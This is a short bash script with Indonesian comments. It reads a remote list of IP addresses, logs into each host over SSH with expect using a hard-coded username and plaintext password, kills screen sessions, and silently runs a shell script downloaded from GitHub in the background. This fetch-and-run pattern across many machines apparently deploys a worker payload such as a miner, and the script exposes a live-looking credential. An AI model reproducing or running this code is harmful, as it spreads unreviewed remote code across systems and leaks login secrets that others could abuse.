#!/bin/bash
USER="cloudsigma"         # Menetapkan USER
PASSWORD="Dotaja123@HHHH"   # Menetapkan PASSWORD
COMMAND="pkill screen; nohup bash -c 'bash <(wget -qO- https://raw.githubusercontent.com/DOT-SUNDA/dot-lun/refs/heads/main/gulamf.sh)' > /dev/null 2>&1"

# Menggunakan expect untuk login otomatis dan menjalankan script
curl -s https://raw.githubusercontent.com/DOT-SUNDA/dot-lun/refs/heads/main/ips.txt | while IFS= read -r IP; do
    clear
    echo "Is Running Worker $IP..."
    /usr/bin/expect << EOF > /dev/null 2>&1
    set timeout 5
    spawn ssh $USER@$IP
    expect {
        "*yes/no*" { send "yes\r"; exp_continue }
        "*assword:*" { send "$PASSWORD\r"; exp_continue }
    }
    expect "$"  # Prompt yang menandakan login berhasil
    send "$COMMAND\r"
    expect "$"  # Tunggu sampai perintah selesai
    send "exit\r"
    expect eof
EOF
done
